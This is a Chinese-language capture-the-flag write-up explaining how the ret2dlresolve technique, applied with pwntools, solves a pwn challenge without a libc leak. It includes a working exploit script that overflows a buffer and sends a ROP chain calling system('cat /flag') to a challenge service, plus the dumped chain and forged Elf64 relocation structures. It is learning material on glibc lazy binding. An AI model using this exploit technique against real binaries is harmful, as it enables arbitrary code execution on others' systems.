# No way to leak

啊？啊？啊？

很早就见过介绍ret2dlresolve的文章： https://syst3mfailure.io/ret2dl_resolve ，但是一直懒得看。今天看了也没看懂，代码使人头晕。于是我突发奇想，去浏览器搜索`pwntools ret2dlresolve`，竟然真的有结果： https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html

打算先抄下来页面上的例子，看看是什么结果。没想到它直接就成功了……
```py
from pwn import *
context.arch='amd64'
file=ELF("./pwn") #如果用了pwninit的话，不要用patch后的版本
rop = ROP(file)
dlresolve = Ret2dlresolvePayload(file, symbol="system", args=["cat /flag"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
p=remote("localhost",36551)
p.sendafter("process.",b'a'*0x78+rop.chain())
p.sendline(dlresolve.payload)
print(p.recvall(timeout=1)) #有时候会显示Inconsistency detected... ，多运行几次即可
```
以下是做完题后（不甘心自己啥也没学到但又不想好好读文章于是写点什么凑数）的记录（基本上是上述文章的简化+不严谨版）

dump出rop链可得到如下结果：
```
0x0000:         0x401293 pop rdi; ret
0x0008:              0x0 [arg0] rdi = 0
0x0010:         0x401291 pop rsi; pop r15; ret
0x0018:         0x404e00 [arg1] rsi = 4214272
0x0020:      b'iaaajaaa' <pad r15>
0x0028:         0x4010a4 read
0x0030:         0x401293 pop rdi; ret
0x0038:         0x404e50 [arg0] rdi = 4214352
0x0040:         0x401020 [plt_init] system
0x0048:            0x304 [dlresolve index]
```
`pop rdi; ret`和`pop rsi; pop r15; ret`的gadget均来自`__libc_csu_init`函数，通过错位某些指令得到。一直到`0x0028`处都没什么特别的，只是在控制read将`dlresolve.payload`读向bss段`0x404e00`处（rdx不用管，因为没有清空vuln处设置的rdx）

根据调试，`0x0030`处控制dlresolve后的函数的rdi。所以如果代码执行成功，dlresolve会跳转system函数，参数为`0x404e50`，对应`cat /flag`

`0x0040`处跳转`0x401020`，为`.plt`代码段。这里只有两段汇编：
```
push   qword ptr [rip + 0x2fe2] //将link_map压入栈上
bnd jmp qword ptr [rip + 0x2fe3] //跳转_dl_runtime_resolve
```
借用上面提到的那篇文章的图就清楚了：

![resolve](https://syst3mfailure.io/ret2dl_resolve/assets/images/lazy_binding.png)

`_dl_runtime_resolve`的定义见 https://elixir.bootlin.com/glibc/glibc-2.31/source/sysdeps/aarch64/dl-trampoline.S#L37 。在gdb里看会更清楚些。该函数保存处理器当前状态，并将栈上的`link_map`和`reloc_arg`转移到rsi和rdi中，最后调用`_dl_fixup`。因此上述payload `0x0048`处的作用是控制`reloc_arg`

关键在[_dl_fixup](https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-runtime.c#L61)里。代码很多，但第一句和`reloc_arg`有关的代码是：
```c
const PLTREL *const reloc = (const void *) (D_PTR(l, l_info[DT_JMPREL]) + reloc_offset);
```
`reloc_offset=reloc_arg * sizeof (PLTREL)=reloc_arg * 0x18`( https://elixir.bootlin.com/glibc/glibc-2.31/source/sysdeps/x86_64/dl-runtime.c )。注意到代码中没有限制`reloc_arg`的大小，所以我们可以通过输入一个很大的`reloc_arg`来控制`reloc`为指向bss段。接下来跟踪`reloc`的相关引用
```c
const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
```
ELFW宏定义如下：
```c
#define ElfW(type)        _ElfW (Elf, __ELF_NATIVE_CLASS, type)
#define _ElfW(e,w,t)      _ElfW_1 (e, w, _##t)
#define _ElfW_1(e,w,t)    e##w##t
```
因此：
```c
ElfW(R_SYM) =
_ElfW(Elf, __ELF_NATIVE_CLASS, R_SYM) =
_ElfW_1(Elf, 64, _R_SYM) =
Elf64_R_SYM
```
根据`Elf64_R_SYM`的[定义](https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/elf.h#L673)，上述代码等于：
```c
const ElfW(Sym) *sym = &symtab[reloc->r_info >> 32];
```
从symtab中取索引为`reloc->r_info >> 32`的`Elf64_Sym`结构体。这个结构体的定义和例子如下：

![Elf64_Sym](https://syst3mfailure.io/ret2dl_resolve/assets/images/elf64_sym.png)

后续有：
```c
void *const rel_addr = (void *)(l->l_addr + reloc->r_offset);
```
`rel_addr`是指向解析后的符号在got中存储位置的指针

下方有一个检查：
```c
assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);
```
把一堆宏定义拆开后，结果为：
```c
assert ((reloc->r_info & 0xffffffff) == 0x7);
```
内容为检查`reloc->r_info`是否为一个有效的`JUMP_SLOT`（用0x7表示）

还有一些伪造结构体的注意事项。我发现文末两种payload均和pwntools里有些许不一样，于是找了pwntools的实现：  https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/rop/ret2dlresolve.py （`_build_structures`函数）

pwntools的构造将目标symbol name，`Elf64_Sym`和`Elf64_Rel`结构体全部放在一起了：
```py
self.payload = fit({
    symbol_name_addr - self.data_addr: symbol_name,
    sym_addr - self.data_addr: sym,
    rel_addr - self.data_addr: rel
})
```
sym如下：
```py
sym = ElfSym(st_name=symbol_name_addr - self.strtab)
```
对应代码里的：
```c
result = _dl_lookup_symbol_x (strtab + sym->st_name, l, &sym, l->l_scope,
    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
```
rel为：
```py
rel = ElfRel(r_offset=self.resolution_addr, r_info=(index<<ELF_R_SYM_SHIFT)+rel_type)
```
构造`r_info`使得代码取到上述伪造的`ElfSym`